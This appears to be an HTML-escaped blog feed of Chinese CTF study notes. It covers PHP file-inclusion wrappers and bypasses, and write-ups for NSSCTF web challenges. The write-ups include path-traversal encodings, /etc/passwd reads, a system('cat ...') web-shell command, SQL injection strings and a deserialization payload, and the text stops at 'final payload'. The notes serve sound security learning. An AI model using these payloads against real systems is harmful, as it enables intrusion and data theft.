&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;file:///D:/phpstudy_pro/WWW/index.html&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file://D:\phpstudy_pro\WWW\index.html&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;看个例子:&lt;/p&gt;
&lt;p&gt;![[Pasted image 20230425131935.png]]&lt;br&gt;
![[Pasted image 20230425132653.png]]&lt;br&gt;
 前面说过后缀名不是 php 但是文件内容符合 php 结构的也可以当作 php 解析，这就是 include 函数&lt;/p&gt;
&lt;h2 id=&#34;4zip协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4zip协议&#34;&gt;#&lt;/a&gt; 4.zip 协议&lt;/h2&gt;
&lt;p&gt;zip:// 本来是用来访问压缩包里的文件。当它与包含函数结合时，zip:// 流就会被当作 php 文件执行&lt;/p&gt;
&lt;p&gt;规则:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;zip:// 中只能传入绝对路径&lt;/li&gt;
&lt;li&gt;要用 #分隔压缩包和压缩包里的内容，并且 #要用 url 编码 %23&lt;/li&gt;
&lt;li&gt;只需要是 zip 的压缩包就行，后缀名可以任意改&lt;br&gt;
 eg 直接用 zip 协议&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;![[Pasted image 20230425141324.png]]&lt;/p&gt;
&lt;p&gt;改成 zip.jpg 后&lt;br&gt;
！[[Pasted image 20230425141432.png]]&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;bzip2,zlib 一样就是绝对路径和相对路径都能用&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;5phar协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5phar协议&#34;&gt;#&lt;/a&gt; 5.phar 协议&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;phar:// 有点类似 zip:// 同样可以导致 任意代码执行。&lt;/li&gt;
&lt;li&gt;可以用相对路径和绝对路径&lt;br&gt;
 poc:&lt;/li&gt;
&lt;li&gt;&lt;code&gt;?file=phar://zip.jpg/phpinfo.txt&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;?file=phar://D:\zip.jpg\phpinfo.txt&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;可以配合文件上传漏洞:&lt;br&gt;
 假如文件上传限制 MIME, 把木马文件压缩成 zip, 再该后缀名为 jpg, 直接 phar 协议执行&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#绕过&#34;&gt;#&lt;/a&gt; 绕过&lt;/h1&gt;
&lt;h2 id=&#34;1指定后缀名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1指定后缀名&#34;&gt;#&lt;/a&gt; 1. 指定后缀名&lt;/h2&gt;
&lt;p&gt;eg&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	error_reporting(0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	$file = $_GET[&amp;quot;file&amp;quot;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	//后缀&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	include $file.&amp;quot;.txt&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	highlight_file(__FILE__);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol&gt;
&lt;li&gt;%00 截断&lt;/li&gt;
&lt;li&gt;长度绕过，一直././././././././,Windows 超过 256 后面丢弃，Linux4096&lt;/li&gt;
&lt;li&gt;url 绕过:&lt;br&gt;
 &lt;code&gt;url:protocol :// hostname[:port] / path / [;parameters][?query]#fragment &lt;/code&gt; &lt;br&gt;
(1).query&lt;br&gt;
payload: &lt;code&gt;http://127.0.0.1/phpinfo.php?&lt;/code&gt; &lt;br&gt;
 拼接后: &lt;code&gt;http://127.0.0.1/phpinfo.php?.txt&lt;/code&gt; &lt;br&gt;
(2)fragment&lt;br&gt;
payload: &lt;code&gt;http://127.0.0.1/phpinfo.php%23&lt;/code&gt; &lt;br&gt;
 拼接后: &lt;code&gt;http://127.0.0.1/phpinfo.php#.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;2编码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2编码&#34;&gt;#&lt;/a&gt; 2. 编码&lt;/h2&gt;
&lt;h3 id=&#34;1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1&#34;&gt;#&lt;/a&gt; 1.  …/&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1.url编码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%2e%2e%2f&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;..%2f&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%2e%2e/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2.二次编码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%252e%252e%252f&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3.容器和服务器编码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;..%c0%af&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;参考:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4L2FydGljbGUvZGV0YWlscy84NzA5MDUzOQ==&#34;&gt;(122 条消息) CTF 中文件包含漏洞总结_LetheSec 的博客 - CSDN 博客&lt;/span&gt;&lt;/p&gt;
</content>
        <updated>2023-04-26T10:30:05.193Z</updated>
    </entry>
    <entry>
        <id>https://hq185187.github.io/2023/04/26/nessctf/</id>
        <title>NSSCTF精选</title>
        <link rel="alternate" href="https://hq185187.github.io/2023/04/26/nessctf/"/>
        <content type="html">&lt;h3 id=&#34;1easy_md5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1easy_md5&#34;&gt;#&lt;/a&gt; 1.easy_md5&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;`&amp;lt;?php     highlight_file(__FILE__);    include &amp;#x27;flag2.php&amp;#x27;;       if (isset($_GET[&amp;#x27;name&amp;#x27;]) &amp;amp;&amp;amp; isset($_POST[&amp;#x27;password&amp;#x27;]))&amp;#123;    $name = $_GET[&amp;#x27;name&amp;#x27;];    $password = $_POST[&amp;#x27;password&amp;#x27;];       if ($name != $password &amp;amp;&amp;amp; md5($name) == md5($password))&amp;#123;           echo $flag;       &amp;#125;       else &amp;#123;           echo &amp;quot;wrong!&amp;quot;;       &amp;#125;       &amp;#125;   else &amp;#123;       echo &amp;#x27;wrong!&amp;#x27;;   &amp;#125;   ?&amp;gt;`&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;md5 弱类型比较&lt;br&gt;
 (1).0e 绕过&lt;br&gt;
以下是一些字符串 md5 值以 0e 开头&lt;br&gt;
 QNKCDZO&lt;br&gt;
240610708&lt;br&gt;
s878926199a&lt;br&gt;
s155964671a&lt;br&gt;
s21587387a&lt;/p&gt;
&lt;p&gt;(2). 数组绕过&lt;br&gt;
 md5 () 函数计算的是一个字符串的哈希值，对于数组则返回 false&lt;br&gt;
 &lt;code&gt;payload:?a[]=1&amp;amp;b[]=2&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;2caidao&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2caidao&#34;&gt;#&lt;/a&gt; 2.caidao&lt;/h3&gt;
&lt;p&gt;(1) antsword 连&lt;br&gt;
 (2) hackbar 传参:`wllm=system (‘cat …/…/…/flag’);&lt;/p&gt;
&lt;h3 id=&#34;3include&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3include&#34;&gt;#&lt;/a&gt; 3.include&lt;/h3&gt;
&lt;p&gt;(1) filter 伪协议&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;php://filter/convert.base64-encode/resource=flag.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这题用 file 协议也可以但是没有得到 flag&lt;br&gt;
 可以这样:?file= &lt;code&gt;file:///etc/passwd&lt;/code&gt; &lt;br&gt;
 但是 &lt;code&gt;?file=file:///var/www/flag.php&lt;/code&gt;  不行&lt;br&gt;
&lt;strong&gt;想深刻了解伪协议的来这里:&lt;/strong&gt;&lt;a href=&#34;https://hq185187.github.io/2023/04/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/&#34;&gt;看看文件包含叭&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;4ezrce&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4ezrce&#34;&gt;#&lt;/a&gt; 4.ezrce&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;`&amp;lt;?php   error_reporting(0);   highlight_file(__FILE__);   if(isset($_GET[&amp;#x27;url&amp;#x27;]))   &amp;#123;   eval($_GET[&amp;#x27;url&amp;#x27;]);   &amp;#125;`&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;学习 Linux 命令&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ls / 列出根目录(\)下的所有目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;发现flag文件在root根目录下,cat /flllllllag来cat根目录下的flag文件&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;深刻了解 Linux 命令来这里&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;5easysql-suctf2019&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5easysql-suctf2019&#34;&gt;#&lt;/a&gt; 5.EasySQL SUCTF2019&lt;/h3&gt;
&lt;p&gt;fuzz:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&amp;#x27; or 1=1--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1&amp;#x27; order by 3--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1&amp;#x27; and updatexml(1,concat(0x7e,database()),1)--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1&amp;#x27; and if(length(database())&amp;gt;1,sleep(5),1)--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;堆叠注入:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1;show databases#&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1;show tables#&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;这两个还可以&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1;show columns from &amp;#x27;Flag&amp;#x27;#&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;失败&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;它的 SQL 查询语句是:&lt;br&gt;
 &lt;code&gt;select $_POST[&#39;query&#39;]||flag from Flag&lt;/code&gt; &lt;br&gt;
 说真的我猜不出来&lt;br&gt;
当 sql_mode 设置了 PIPES_AS_CONCAT 时，|| 是字符串连接符，相当于 concat () 函数&lt;/p&gt;
&lt;p&gt;&lt;code&gt;payload1:*,1&lt;/code&gt; &lt;br&gt;
sql: &lt;code&gt;select *,1||flag from Flag&lt;/code&gt; , 这样查询出了 Flag 表的所有内容&lt;br&gt;
此处的 1 是临时增加一列，列名为 1||flag 且这一列的所有值都为 1&lt;/p&gt;
&lt;p&gt;payload2: &lt;code&gt;1;set sql_mode=PIPES_AS_CONCAT;select 1 sql:&lt;/code&gt; select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag&lt;/p&gt;
&lt;p&gt;返回一个列名为 1||flag, 列元素为 1flag 的值的表&lt;/p&gt;
&lt;h3 id=&#34;6zjctf-2019nizhuansiwei&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6zjctf-2019nizhuansiwei&#34;&gt;#&lt;/a&gt; 6.[ZJCTF 2019]NiZhuanSiWei&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$text = $_GET[&amp;quot;text&amp;quot;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$file = $_GET[&amp;quot;file&amp;quot;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$password = $_GET[&amp;quot;password&amp;quot;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if(isset($text)&amp;amp;&amp;amp;(file_get_contents($text,&amp;#x27;r&amp;#x27;)===&amp;quot;welcome to the zjctf&amp;quot;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    echo &amp;quot;&amp;lt;br&amp;gt;&amp;lt;h1&amp;gt;&amp;quot;.file_get_contents($text,&amp;#x27;r&amp;#x27;).&amp;quot;&amp;lt;/h1&amp;gt;&amp;lt;/br&amp;gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(preg_match(&amp;quot;/flag/&amp;quot;,$file))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        echo &amp;quot;Not now!&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        exit(); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        include($file);  //useless.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $password = unserialize($password);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        echo $password;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    highlight_file(__FILE__);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;第一步：绕过 file_get_contents&lt;br&gt;
(1)php://input&lt;br&gt;
?text=php://input&lt;br&gt;
post 传参: &lt;code&gt;welcome to the zjctf&lt;/code&gt; &lt;br&gt;
 (2) data 协议&lt;br&gt;
 &lt;code&gt;?text=data://text/plain,welcome to the zjctf&lt;/code&gt; &lt;br&gt;
 根据提示的 useless.php 可以发现可以用伪协议读取&lt;br&gt;
 &lt;code&gt;file=php://filter/read=convert.base64-encode/resource=useless.php&lt;/code&gt; &lt;br&gt;
 第一步:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?text=file=php://input&amp;amp;&amp;amp;file=php://filter/read=convert.base64-encode/resource=useless.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;post传参:welcome to the zjct&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;经过 base64 解码得到 useless.php&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class Flag&amp;#123;  //flag.php  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public $file;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public function __tostring()&amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if(isset($this-&amp;gt;file))&amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            echo file_get_contents($this-&amp;gt;file); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return (&amp;quot;U R SO CLOSE !///COME ON PLZ&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意 tostring 魔术方法在对象被当作字符串处理时会调用，index 里就是 echo&lt;/p&gt;
&lt;p&gt;payload:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class Flag&amp;#123;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public $file=&amp;#x27;flag.php&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$p=new Flag();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo urlencode(serialize($p));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;`&lt;br&gt;
 最终 payload:&lt;/p&gt;
